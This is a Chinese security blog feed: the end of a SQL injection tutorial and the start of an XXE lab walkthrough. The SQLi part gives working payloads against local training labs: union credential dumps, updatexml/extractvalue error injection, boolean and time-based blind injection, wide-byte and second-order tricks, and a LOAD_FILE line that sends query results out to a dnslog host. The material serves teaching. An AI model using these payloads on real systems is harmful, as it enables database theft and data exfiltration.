<p><a href="http://127.0.0.1/sqli/Less-1/?id=1&#39;">http://127.0.0.1/sqli/Less-1/?id=1&#39;</a> union select 1,2,group_concat(concat_ws(“_”,password, username))  from users–+  ==》连接所有账号信息</p>
<p>主要思路：查库=》查表=》查列=》查字段=》获取信息</p>
<h2 id="0x05-报错注入"><a href="#0x05-报错注入" class="headerlink" title="0x05 报错注入"></a>0x05 报错注入</h2><h3 id="1-原理："><a href="#1-原理：" class="headerlink" title="1.原理："></a>1.原理：</h3><p>这是一种页面响应形式，响应过程如下：用户在前台页面上输入检索内容时，后台将前端页面上输入的内容不加区别的拼接成sql语句在数据库执行。数据库将执行结果返回给后台。后台将数据库执行结果不加区别的显示到前台页面。</p>
<h3 id="2-条件："><a href="#2-条件：" class="headerlink" title="2.条件："></a>2.条件：</h3><p>MySQL报错信息必须能够在页面回显：区分php报错和mysql报错。报错注入页面没有显示位，但有sql语句执行错误信息，输出-1’ and extractvalue(1, concat( ‘~’ ,(select version() limit 0,1))) –+</p>
<h3 id="3-要求"><a href="#3-要求" class="headerlink" title="3.要求:"></a>3.要求:</h3><p>需要能够知道MySQL中哪些函数有限制条件，利用限制条件进行报错，需要了解函数原理有才知道熟悉运用。</p>
<h3 id="4-报错注入步骤-（判断闭合后）"><a href="#4-报错注入步骤-（判断闭合后）" class="headerlink" title="4.报错注入步骤:（判断闭合后）"></a>4.报错注入步骤:（判断闭合后）</h3><p>获取数据库：</p>
<p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a> and updatexml(1,concat(‘~’,(select schema_name from information_schema.schemata limit 0,1)),1) –+</p>
<p>获取表名：</p>
<p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a> and updatexml(1,concat(‘~’,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1) –+</p>
<p>获取字段名：</p>
<p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a> and updatexml(1,concat(‘~’,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 0,1)),1) –+</p>
<p>可以引入substr( )函数和ascii( )函数进行单个字符的比较以及ASCII码的判断。注意：updatexml读取字符的长度只能是32位。若读取数据太长需要切片儿，如下：</p>
<p>select updatexml(1,concat( ‘~’ ,substr((select GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database()),1,30)),1);</p>
<h3 id="5-报错注入的各种姿势："><a href="#5-报错注入的各种姿势：" class="headerlink" title="5.报错注入的各种姿势："></a>5.报错注入的各种姿势：</h3><p>① Extractvalue报错注入</p>
<p>ExtractValue(xml_frag, xpath_expr)</p>
<p>参数1：XML_document是String格式，为XML文档对象的名称;</p>
<p>参数2：XPath_string (Xpath格式的字符串).</p>
<p>作  用：从目标XML中返回包含所查询值的字符串</p>
<p>ExtractValue()接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它 返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</p>
<p>第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径</p>
<p>extractvalue(1,concat(‘~’,(select @@version)))</p>
<p>② updatexml报错注入</p>
<p>UPDATEXML (XML_document, XPath_string, new_value);</p>
<p>参数1：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
<p>参数2：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p>
<p>参数3: new_value，String格式，替换查找到的符合条件的数据</p>
<p>作用：改变xml文档中符合条件的节点的值</p>
<p>updatexml(1,concat(‘~’,(SELECT @@version),0x7e),1)</p>
<p>③Floor()报错注入</p>
<p>Mysql：select * from user where id=’1’  union select count(*),concat(floor(rand(0)*2),’~ ‘,version())x from information_schema.schemata group by x;</p>
<p>rand( )和rand(0)</p>
<p>功能：返回0-1之间的随机数，如果输入随机种子参数0，每次返回的是固定的0-1之间的随机数</p>
<p>count(*) 的作用</p>
<p>功能：返回匹配指定条件对应的行数；参数及返回值：返回数据条数</p>
<p>group by语句工作原理</p>
<p>group by语法可以根据指定数据列的每个成员对查询结果进行分组统计，最终得到一个分组汇总表。</p>
<p>floor()函数</p>
<p>floor函数的作用是返回小于等于该值的最大整数 floor(2.99)=2</p>
<p>当group by 在查询虚拟表和插入虚拟表时，如果这两次查询语句执行的结果不一致就会引发错误，错误提示信息是插入的主键重复,通过自定义提示里报错信息中的主键值来获得敏感信息。</p>
<h2 id="0x06-盲注"><a href="#0x06-盲注" class="headerlink" title="0x06 盲注"></a>0x06 盲注</h2><h3 id="1-布尔盲注"><a href="#1-布尔盲注" class="headerlink" title="1.布尔盲注"></a>1.布尔盲注</h3><p>“布尔判断”指的是利用SQL语句逻辑与(and)操作，判断and两边的条件是否成立，SQL语句带入数据库查询后判断返回内容(通常返回值仅有非空和空两种状态)，类似布尔型的true和false的两种状态。</p>
<p>①布尔盲注步骤:(确定注入点后)</p>
<p>判断查询数据库数目<br><a href="http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;">http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;</a> and (select count(schema_name) from information_schema.schemata)=15 –+</p>
<p>判断当前数据库长度</p>
<p><a href="http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;">http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;</a> and length(database())=5 –+</p>
<p>猜解数据库名</p>
<p><a href="http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;">http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;</a> and substr((select schema_name from information_schema.schemata limit 1,1),1,1)=’s’ –+</p>
<p>猜解数据表名</p>
<p><a href="http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;">http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;</a> and substr((select table_name from information_schema.tables where table_schema=”bricks” limit 0,1),1,1)=’s’ –+</p>
<p>猜解列名</p>
<p><a href="http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;">http://127.0.0.1/webug/control/sqlinject/bool_injection.php?id=1&#39;</a> and substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1)=’s’ –+</p>
<p>②使用到的函数  </p>
<p>length(string)</p>
<p>功能:获取字符串的长度</p>
<p>参数及返回值:</p>
<p>string为操作字符串，返回字符串string的长度</p>
<p>举例1:</p>
<p>$ret = length(“hello”);</p>
<p>ret= 5;</p>
<p>举例2:</p>
<p>length(database())&gt;5 #判断数据库名长度大于5</p>
<p>cast(expression as type)</p>
<p>功能:将任何类型的值转换为具有指定类型的值</p>
<p>参数及返回值:</p>
<p>expression为操作字符串type为转化类型，返回的是转化后的值;</p>
<p>举例1:</p>
<p>$ret = cast(’12’ as int); ret=12;</p>
<p>Cast函数通常和mid和ord函数-起配合使用</p>
<p>substr(string,start,length)<br>功能:截取字符串功能<br>返回值:为截取后的字符串<br>参数:string为操作字符串， start为开始位置， length为截取长度<br>举例1:<br>$ret = substr(“hello kali’”,2,4);<br>ret= “ello”;<br>举例2:<br>substr(database(),1,1)&gt;’a’ //判断数据库名第一位是否大于a; 再查看其他位进行判断</p>
<p>left(string, n) ===&gt; right()同<br>功能: 返回字符串string最左边的n个字符串<br>返回值: string最左边的n个字符串<br>参数:string为操作字符串，n为截取长度<br>举例1:<br>$ret = left(“redhat”,3);<br>ret= “red”;<br>举例2:<br>left(database(),2)=’sa’ #判断数据库名前2个字符是否位sa;再查看其他位进行判断</p>
<p>mid(string , start, length)<br>功能:截取字符串功能==substr( )<br>返回值:为截取后的字符串<br>参数:string为操作字符串，start为开始位置， length为截取长度<br>举例1:<br>$ret = mid(“hello kali”,2,4);<br>ret=“ello”;<br>举例2:<br>mid(database0,1,1)&gt;’a’ #判断数据库名第一位是否大于a;再查看其他位进行判断</p>
<p>ascii(str)<br>功能: str为字符或者字符串，用于返回字符或字符串最左边的ascii码，有时候服务器会对单引号进行转义，使用ASCII码就不用使用单引号参数:(功能和ord-样)<br>参数: char为操作;<br>返回值:返回字符char的asi码<br>举例1:<br>$ret = ascii(‘a’);<br>ret= 97;<br>举例2:<br>ascii(mid(database(),1,1))&gt; 114 #意为检测database()的第一-位ASCI码是否大于114,即是’r’</p>
<h3 id="2-时间盲注"><a href="#2-时间盲注" class="headerlink" title="2. 时间盲注"></a>2. 时间盲注</h3><p>原理:利用if函数，执行判断:</p>
<p>如果正确，直接返回(时间很长，网速有一定的影响):</p>
<p>如果不正确，执行时间延迟，常用的函数有sleep和benchmark</p>
<p>以上操作也可反过来:</p>
<p>适用环境:界面无法用布尔真假判断，也无法报错注入的情况下</p>
<p>①时间盲注步骤（pikachu靶场）</p>
<p>判断闭合方式<br><a href="http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?username=kobe&#39;">http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?username=kobe&#39;</a> and sleep(5) #&amp;submit=%E6%9F%A5%E8%AF%A2</p>
<p>判断数据库名（pikachu）<br><a href="http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=vince&#39;">http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=vince&#39;</a> and if(ascii(substr((select database()),1,1))=112,sleep(5),1) –+&amp;submit=%E6%9F%A5%E8%AF%A2</p>
<p>数据表(httpinfo)<br><a href="http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=vince&#39;">http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=vince&#39;</a> and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=’pikachu’),1,1))=104,sleep(5),1) –+ &amp;submit=%E6%9F%A5%E8%AF%A2</p>
<p>列名(id userid ipiddress useragent httpaccep )<br><a href="http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=vince&#39;">http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=vince&#39;</a> and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=’httpinfo’ and table_schema=’pikachu’),1,1))=104,sleep(5),1) –+</p>
<p>②使用到的函数</p>
<p>if(condition,expr2,expr3)</p>
<p>功能:如果condition是TRUE，则IF()的返回值为expr1;否则返回值则为expr2。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定;</p>
<p>举例1:</p>
<p>Select if(true,1+1,1+2);-&gt; 2</p>
<p>sleep(arg1)</p>
<p>功能: argl为中断的时间， 单位为秒:</p>
<p>举例1:</p>
<p>if(payload, sleep(5), 1);如果测试语句正确，暂停5秒</p>
<p>select if (true, sleep(5),2)</p>
<p>SELECT if(5&gt;2,SLEEP(5),520)</p>
<p>benchmark()</p>
<p>benchmark(arg1,arg2)</p>
<p>arg1操作次数，arg2为表达式。</p>
<p>语句:and if(payload, benchmark(5000000,md5(‘abc’)), 1)</p>
<p>返回结果:页面延迟10秒左</p>
<h2 id="0x07-常见四种注入分析"><a href="#0x07-常见四种注入分析" class="headerlink" title="0x07 常见四种注入分析"></a>0x07 常见四种注入分析</h2><p>四种注入方式分析</p>
<p>\1. union注入能直接显示出想要数据，使用简单。</p>
<p>\2.报错注入输入错误会直接显示数据库错误信息，我们可以通过报错注入直接获取想要的信息，与union注入 相比，稍微麻烦- -点，但是能直接显示信息。</p>
<p>\3.布尔注入会间接显示查询语句是否正确，但不会显示关键信息重复操作多</p>
<p>\4.时间注入不管sql语句是否正确，不会返回任何信息，只能通过页面缓冲的时间来判断</p>
<p>综上所述，如果能够直接按union是最好的，如果爆出了数据库错误可以使用报错注入，如果没有明显错误但是间接反馈了语句是否执行正确，可以布尔注入，如果什么信息都没返回只有试试时间延迟注入。</p>
<h2 id="0x08-宽字节注入"><a href="#0x08-宽字节注入" class="headerlink" title="0x08 宽字节注入"></a>0x08 宽字节注入</h2><h3 id="1-注入原理"><a href="#1-注入原理" class="headerlink" title="1.注入原理:"></a>1.注入原理:</h3><p>一个GBK汉字占两个字节，每个字节有自己的取值范围，如果设置GBK编码后，遇到连续两个字节，都符合GBK取值范围，会自动解析为一个汉字。Addslashes函数防止sq|注入，将传入参数值进行转义。例如将’转义为\ ,这样我们在注入的时候闭合单引号就会变成id= ‘1&#39; 这样会导致闭合失败从而注入失败。</p>
<h3 id="2-涉及的函数"><a href="#2-涉及的函数" class="headerlink" title="2.涉及的函数"></a>2.涉及的函数</h3><p>mysql_real_escape_ string()</p>
<p>转义SQL 语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集。</p>
<p>string mysql_ real <em>escape</em> string( string Sunescaped_ string[,resource $link_ identifier] )</p>
<p>下列字符受影响:  \x00  \n  \r  \  ‘  “  \x  1a</p>
<p>preg_ replace函数—执行一个正则表达式的搜索和替换<br>mixed preg_ replace( mixed $pattern, mixed $replacement, mixed $subject[, int $limit = -1[, int &amp;$count]] )</p>
<p>搜索subject中匹配pattern的部分，以replacement进 行替换。</p>
<p>addslashes()函数。</p>
<p>addslashes()函数转义SQL 语句中使用的字符串中的特殊字符。下列字符受影响: $a=”abc”;</p>
<p>1.单引号(’)    2.双引号(“)    3.反斜杠()    4. NULL</p>
<p>如’会被转义成\’    “被转义成\”   \被转义成\   NULL被转 义成\NULL</p>
<p>一个使用addslashes() 的例子是当你要往数据库中输入数据时。</p>
<p>例如，将名字O’reilly 插入到数据库中，这就需要对其进行转义。</p>
<p>string addslashes( string $str)</p>
<p>$value = stripslashes($value); =》去掉斜杠</p>
<p>mysql_real_escape_string和mysql_escape_string区别</p>
<p>两者都是过滤字符串，防止sql注入，但两者有一些区别</p>
<p>mysql_real_escape_string:</p>
<p>1.具有两个参数，其中第二个为选填参数，默认为上一个数据库链接connection</p>
<p>2.使用之前要先连接上数据库，否则会出错</p>
<p>3.在过滤字符串的时候，会考虑当前链接connection字符集，(set names ‘utf-8’)</p>
<p>mysql_escapte_string是处理单个字符串函数.</p>
<p>不过从PHP5.4开始，PHP官方就鼓励使用mysqli和PDO来操作数据库了。</p>
<h3 id="3-宽字节注入防御"><a href="#3-宽字节注入防御" class="headerlink" title="3.宽字节注入防御"></a>3.宽字节注入防御</h3><p>①使用mysql_ set_ charset(GBK)指定字符集<br>②使用mysql_real _escape_string进行转义<br>原理是，mysql_real_escape_ string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面e5和5c拼接为一个宽字节的问题，但是这个“当前字符集”如何确定呢?就是使用mysql_set_charset进行指定。上述的两个条件是”与”运算的关系，少一条都不行。</p>
<p>在进行php 连接mysql 时，当设置”ser character_set_client=gbk” 时会导致一个编码转换的注入问题，也就是熟悉的宽字节注入，当存在宽字节注入时，%df%27 可把程序中过滤的\ （%5c）吃掉。</p>
<h2 id="0x09-堆查询注入"><a href="#0x09-堆查询注入" class="headerlink" title="0x09 堆查询注入"></a>0x09 堆查询注入</h2><h3 id="1-什么是堆叠注入"><a href="#1-什么是堆叠注入" class="headerlink" title="1.什么是堆叠注入?"></a>1.什么是堆叠注入?</h3><p>在SQL中，分号( ; )是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sq|语句后继续构造下一条语句，会不会一 起执行?因此这个想法也就造就了堆叠注入。而union injection (联合注入)也是将两条语句合并在一-起，两者之间有什么区别么? 区别就在于union或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p>
<h3 id="2-堆叠注入局限性"><a href="#2-堆叠注入局限性" class="headerlink" title="2.堆叠注入局限性"></a>2.堆叠注入局限性</h3><p>局限1:堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<p>局限2:虽然堆叠查询可以执行任意的sql 语句，但这 种注入方式并不是十分完美。在web系统中，因为代码通常 只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时， 建议使用 union (联合)注入。同时 在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p>
<h2 id="0x0A-其他类型注入"><a href="#0x0A-其他类型注入" class="headerlink" title="0x0A 其他类型注入"></a>0x0A 其他类型注入</h2><h3 id="1-二次注入"><a href="#1-二次注入" class="headerlink" title="1.二次注入"></a>1.二次注入</h3><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。二次注入 也称为存储型注入。</p>
<p>二次注入，可以概括为以下两步:</p>
<p>第一步:插入恶意数据</p>
<p>进行数据库插入数据时，对其中的特殊字符进行转义处理，在写入数据库时又保留了原来的数据。</p>
<p>第二步:引用恶意数据</p>
<p>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
<h3 id="2-二次编码注入-部分函数可见前宽字节注入"><a href="#2-二次编码注入-部分函数可见前宽字节注入" class="headerlink" title="2.二次编码注入(部分函数可见前宽字节注入)"></a>2.二次编码注入(部分函数可见前宽字节注入)</h3><p>现通常Web应用程序大多都会进行参数过滤，来防止注入。如果某处使用了urldecode或者 rawurldecode 函数，则会导致二次解码生成单引号二引发注入，即二次注入。</p>
<p>Web应用程序通常使用addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数或者开启GPC来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠()和NULL加上反斜杠转义。<br>原理：由于我们提交id参数到webserver时，webserver会自动解码一次，假设目标程序开启了GPC，我们提交参数id=1%2527 ，经过第一次解码后，%25解码结果为%，则参数为id=1%27，第二次程序使用了urldecode 或者 rawurldecode 函数来解码id参数，则解码后结果为id=1’ ，这时单引号成功出现引发注入。</p>
<h3 id="3-dnslog注入"><a href="#3-dnslog注入" class="headerlink" title="3.dnslog注入"></a>3.dnslog注入</h3><p>select LOAD_FILE(CONCAT(‘\\‘,(SELECT version()),’.tfq4oz.dnslog.cn\abc’)); –+</p>
<p>利用dns解析日志来达到快速盲注。</p>
<h2 id="0x0B-参考文章"><a href="#0x0B-参考文章" class="headerlink" title="0x0B 参考文章"></a>0x0B 参考文章</h2><p><a href="https://blog.csdn.net/qq_36711453/article/details/83714363">https://blog.csdn.net/qq_36711453/article/details/83714363</a>   关于二次注入部分</p>
<p><a href="https://xz.aliyun.com/t/2869">https://xz.aliyun.com/t/2869</a>   其他注入方式</p>
<h2 id="0x0C-小结"><a href="#0x0C-小结" class="headerlink" title="0x0C 小结"></a>0x0C 小结</h2><p>在写这个文章得过程中仍然发现自己在很多知识的理解和使用上存在欠缺，希望在日后的生活中能够慢慢练熟，摸透。。。如果文中哪些知识点存在问题，请您指正，不甚感激。。。学安全，菜是原罪，只能好好努力啦。。</p>
<p>然后我这里有关于sql,xss,dvwa,webug,pikachu,文件上传等一些靶场，还有大佬总结的sql-labs-master的通关宝典，有需要私信我。。。加油啦</p>
<p>本文作者：hackerqdy， 转载请注明来自<a href="https://www.qdy2020.top/">GitHub</a></p>
]]></content>
  </entry>
  <entry>
    <title>XML外部实体注入漏洞</title>
    <url>/2020/08/14/xxe/</url>
    <content><![CDATA[<ol>
<li><h5 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h5><p>xml： eXtensibleMarkup Language,可扩展标记语言，使用简单的标记来描述数据。</p>
<p>xml是一种非常灵活的语言，类似于HTML语言，但是并没有固定的标签，所有的标签都可以自定义，其设计的宗旨是传输数据，而不是像HTML一样显示数据。<a id="more"></a></p>
</li>
</ol>
<p>   xml不会做任何事情，它是被设计用来结构化、存储以及传输信息，也就是xml文件所携带的信息，需要被其他的语言或者程序来解析，才能发挥作用。</p>
<p>\2.  XML的用处</p>
<p>   通常，xml被用于信息的记录和传递(比如，数据库的导出导入会很麻烦，但是xml会很方便)，也会被用于充当配置文件。也会被应用于Web 开发的许多方面，常用于简化数据的存储和共享。如：</p>
<p>   XML 把数据从 HTML 分离，更方便在HTML文档中显示动态数据。</p>
<p>   XML 简化数据共享，XML数据以纯文本格式进行存储，因此提供了一种独立于软件和硬件的数据存储方法。这让创建不同应用程序可以共享的数据变得更加容易。</p>
<p>   XML 简化数据传输，由于可以通过各种不兼容的应用程序来读取数据，以 XML 交换数据降低了不兼容系统之间交换书据的复杂性。</p>
<p>   XML 简化平台变更，使用XML存储一些不兼容的数据，可以在系统或软件升级，转换大量的数据时，避免数据的丢失。</p>
<p>   XML 使您的数据更有用，XML可以使不同的应用程序都能够访问您的数据，使得数据的用途更广。</p>
<p>   XML 用于创建新的互联网语言，如XHTML、WSDL、WAP 和 WML、RSS 、RDF 和 OWL等</p>
<p>\3.  什么是XML注入</p>
<p>   XML与HTML一样，也存在注入漏洞。比如：一个 web 应用，在进行用户注册时，选择以 xml 来存储数据到 xmldb 数据库中，当用户填写用户名，密码和邮箱时，后台存储的文件格式及内容如下：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/7f2cef17-3494-4a3a-828c-64159c035811.png" alt="img"></p>
<p>   那么攻击者就可以在注册的时候构造恶意的数据，假设他在用户名与密码的输入框中输入正常的文本，在最后的邮箱输入框中输入如下内容：</p>
<p>   <img src="https://www.hetianlab.com/pages/registerUser/headImg.action?guideImg=/08894e79-3fec-4d93-9e18-9a0c290dd8e3.png" alt="img"></p>
<p>   那么就会多注册一个名为admin的用户。</p>
<p>   综合上面的小例子，我们可以知道,能够进行XML注入攻击的前提是，用户能够控制数据的输入，程序没有对输入的内容进行过滤且拼接了数据。那么相应的，破坏掉其中一个前提就可以进行防御了，既然我们无法限制用户的输入，那么就可以对数据进行过滤，将XML语言本身的“保留字符”进行过滤或者转义即可。</p>
<p>\4.  什么是XXE注入漏洞：</p>
<p>   XXE注入也是XML注入的一部分，但相较于普通的XML注入，XXE注入的攻击面更广，危害更大。</p>
<p>   XXE注入(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，所注入的对象就是我们实验任务一中提到的重点： XML外部实体。当遇见能够解析XML内容的页面时，如果能注入外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面。</p>
<p>   XXE的攻击形式主要分为：带内数据实体注入、基于错误的实体注入和带外数据实体注入</p>
<p>   带内数据实体注入：in-band ,XML解析后的数据会直接显示在屏幕上</p>
<p>   基于错误：error-based，解析结果只有一大堆的错误</p>
<p>   带外数据：out-of-band，也叫XXE盲注，注入的XML解析后无任何输出响应，必须执行一些带外请求把数据提取出来。</p>
<p>\5.  XXE注入能做什么：</p>
<p>   a. 任意文件读（<strong>本实验重点</strong>）</p>
<p>   b. SSRF，服务端请求伪造，借助漏洞实现内网探测，</p>
<p>   c. DOS攻击</p>
<p>   d. 远程命令执行</p>
<p>\6.  PHP的XXE注入产生的条件：</p>
<p>   a. Libxml的版本尽可能的低，libxml是PHP的xml解析库，因为从2.8.0版本开始，libxml默认是不加载外部实体的，如果要使用较高版本的libxml的话，需要在编写代码的时候对参数做设置。</p>
<p>   b. 目标主机没有禁用外部实体的引用。</p>
<p>   c. 用户可以控制xml的输入内容</p>
<p>实验目的</p>
<p>XML注入是web应用中常见的一种漏洞，尤其是XXE注入（XML外部实体注入）漏洞所造成的危害也是很严重的。通过本实验，了解在PHP的web应用程序中，XXE注入漏洞形成的原理以及利用形式、利用方法等。</p>
<p>实验环境</p>
<p>服务器：Windows 10 ，IP地址：10.1.1.123</p>
<p>辅助工具：phpstudy</p>
<p>实验步骤一</p>
<p><strong>任务描述：学习XML基础知识。</strong></p>
<p>1、一个XML示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!--这里是注释--&gt;</span><br><span class="line">&lt;books&gt;</span><br><span class="line">    &lt;book id&#x3D;&quot;b01&quot;&gt;</span><br><span class="line">        &lt;name&gt;Python黑客编程从入门到入狱&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;author&gt;张三&lt;&#x2F;author&gt;</span><br><span class="line">        &lt;price&gt;$20.00&lt;&#x2F;price&gt;</span><br><span class="line">    &lt;&#x2F;book&gt;</span><br><span class="line">&lt;&#x2F;books&gt;</span><br></pre></td></tr></table></figure>



<p>      如上代码，第一行是XML文档的声明，由“<?xml”开头，以“?>”结尾，其中的内容是对本xml文档所使用的版本 “version”和编码“encoding”的声明，version一般情况下都是1.0，因为目前为止，xml只有这一个版本。      第二行是注释，不多做解释。      从第三行开始，就是XML文档的主要内容了，如代码中所示的“<books>”，是本文档的根元素，“<book>”是“<books>”的子元素，而“<name>、<author>、<price>”也都是子元素，但是是“<book>”的子元素。      那么我们可以将这个XML文档，视为是一个描述图书的文档，它所描述的内容，包括了图书的名字、作者和价格，如果使用程序对这个文档进行解析后，那么这些信息就可以更好的显示在web页面或者是应用程序中，方便用户查看。2、XML的格式      a. 声明信息，用于描述xml的版本及编码格式。<?xml version="1.0" encoding="utf-8" ?>      b. xml有且仅有一个根元素（可以理解为顶级的元素、没有被其他元素包起来的元素）。个人理解：像是数据库的表名      c. xml中大小写敏感      d. 标签是成对出现的，所有元素都必须有一个关闭标签，而且要正确嵌套。      e. 属性值要使用双引号      f. 注释的写法。<!--这是注释 -->      g. 一个格式良好的xml文件<?xml version="1.0" encoding="utf-8"?> <!--这里是注释--> <books>     <book id="b01">         <name>Python黑客编程从入门到入狱</name>         <author>张三</author>         <price>$20.00</price>     </book> </books>      h. XML并不是让用户直接打开的，而是让别的语言来从文件中读取信息的。至于为什么可以直接用浏览器浏览，只是浏览器可以识别而已。3、 XML的属性      虽然XML像HTML一样，也有属性，但是一般不推荐使用属性，如果某个信息看起来很像是数据，那么最好是使用元素来表示它，而不是属性。4、 XML验证      拥有正确语法的 XML 被称为”形式良好”的 XML。而判断XML的语法是否合法，叫做XML验证，是通过 DTD进行验证的。      DTD：Document TypeDefinition 文档类型定义。用于约束xml的文档格式，保证xml是一个有效的xml，DTD分为内部和外部两种。DTD定义在xml文件中视为内部DTD；DTD定义在外部的dtd文件中，视为外部DTD。      说的简单一点，DTD就是对当前的XML文档做一个约束，DTD中定义了这个文档中的根元素是什么，有几个子元素，每个子元素能出现几次，哪些元素有属性，属性的类型是什么，属性的默认值是什么等等，如果后面的XML内容中，与DTD中的定义不符，如元素个数不符、元素名称大小写不符等，那么XML文件解析时就会报错。1）内部DTD的使用：      内部DTD的定义<!DOCTYPE 根元素 [元素声明]>      元素声明语法[ <!ELEMENT 根元素 (子元素)> <!ELEMENT 根元素的子元素 (子元素的子元素，子元素的子元素)> <!ELEMENT 子元素 (数据类型)> <!ELEMENT 子元素 (数据类型)> ]      元素声明中的数量词”+” 表示出现一次或者多次 “?”表示出现0次或多次 “*”表示出现任意次。      属性声明语法<!ATTLIST 元素名称 属性名称  属性类型 默认值>      示例：<?xml version="1.0" encoding="utf-8"?> <!--这里是注释--> <!DOCTYPE books [     <!ELEMENT books (book+)>     <!ELEMENT book (name,author,price)>     <!ATTLIST book id CDATA #REQUIRED>     <!ELEMENT name (#PCDATA)>     <!ELEMENT author (#PCDATA)>     <!ELEMENT price (#PCDATA)>      ]&gt; <books>     <book id="b01">         <name>Python黑客编程从入门到入狱</name>         <author>张三</author>         <price>$20.00</price>     </book> </books>      如上，就是一个内部DTD的引用示例，在DTD定义中，要求根元素books的子元素book出现一次及以上，子元素book又有三个子元素，分别为name，author和price，然后声明了元素book的id属性，其类型是CDATA，并且是必须的（#REQUIRED），最后定义了book的三个子元素的数据类型为#PCDATA，这表示这三个元素标签中的内容必须是文本，并能再出现子标签。2）外部DTD的使用：      首先需要创建一个外部的dtd文件。内容中不需要包括&lt;!DOCTYPE…&gt;，直接&lt;!ELEMENT…&gt;，如下所示：<?xml version="1.0" encoding="utf-8"?> <!ELEMENT books (book+)> <!ELEMENT book (name,author,price)> <!ATTLIST book id CDATA #REQUIRED> <!ELEMENT name (#PCDATA)> <!ELEMENT author (#PCDATA)> <!ELEMENT price (#PCDATA)>      然后在XML文档中引入外部的DTD：<!DOCTYPEbooks SYSTEM "xxx.dtd">      注意外部实体引用时的关键字“SYSTEM”，同时也可以使用“PUBLIC”这个关键字，这两者的区别在于，SYSTEM表示私有的DTD，PUBLIC表示共有的DTD。5、DTD实体（重点学习）      首先，什么是DTD实体，简单点理解，实体就像是变量，可以用于存储数据，以便后续的使用。但它的功能又不仅仅是存储，比如外部实体，除了可以存储数据，还可以从远程文件或远程网络中读取内容或调用数据。至于什么是外部实体，别着急，接着往后看。      从实体被定义的位置来看，实体可以分为内部实体和外部实体，就像内部DTD和外部DTD一样，内部实体，就是在XML文档内部的DTD进行定义的实体，外部实体就是定义在外部DTD文件中然后被引用到当前XML中的实体。1）内部实体声明：      声明语法：<!ENTITY 实体名称 "实体的值">      一个实体的引用，由三部分构成:&amp;符号, 实体名称, 分号。      内部实体引用示例：<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE books [     <!ENTITY test "Hello World"> ]&gt;  <books>&test;</books>       PHP解析示例代码：            使用浏览器进行访问，并将xml代码作为参数传入，可以不复制xml声明，记得要将引用实体时的“&amp;”手动编码为“&amp;”（因为我们这里使用的是GET传参的方式，所以传入的内容会被进行URL编码，但是&amp;在URL中被认为是两个参数的分隔符，所以如果我们不对其进行URL编码转换，浏览器会把它当作参数的分隔符来处理）：      2）外部实体声明：      声明语法：<!ENTITY  实体名称 SYSTEM "URI/URL" >      